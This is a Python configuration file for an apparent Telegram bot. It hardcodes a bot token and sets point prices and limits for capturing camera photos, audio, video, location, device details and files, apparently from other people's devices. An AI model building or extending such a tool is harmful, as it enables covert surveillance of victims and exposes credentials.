import os
from dotenv import load_dotenv

load_dotenv()

class Config:
    # البوت
    BOT_TOKEN = os.environ.get('BOT_TOKEN', '8847400367:AAG20gRwvMtQXNVy2iZL9hB7gSp2JeUQIuI')
    
    # الرابط العام (سيتم تعيينه تلقائياً من Railway)
    BASE_URL = os.environ.get('BASE_URL', 'https://your-app.railway.app')
    
    # المفاتيح
    SECRET_KEY = os.environ.get('SECRET_KEY', 'your-secret-key-here')
    
    # المجلدات
    UPLOAD_FOLDER = 'uploads'
    DATABASE_FILE = 'data.db'
    
    # الإعدادات الافتراضية
    DEFAULT_FREE_ATTEMPTS = 3  # عدد المحاولات المجانية يومياً
    DEFAULT_VIDEO_DURATION = 30  # مدة الفيديو الافتراضية (ثانية)
    DEFAULT_AUDIO_DURATION = 30  # مدة الصوت الافتراضية (ثانية)
    DEFAULT_CAMERA_COUNT = 3  # عدد الصور الافتراضي
    
    # أسعار النقاط (يمكن تعديلها عبر البوت)
    PRICES = {
        'camera': 5,   # نقاط لكل صورة
        'audio': 10,   # نقاط لكل تسجيل
        'video': 15,   # نقاط لكل فيديو
        'location': 3, # نقاط لكل موقع
        'device': 2,   # نقاط لكل معلومات جهاز
        'files': 20    # نقاط لكل ملف
    }

config = Config()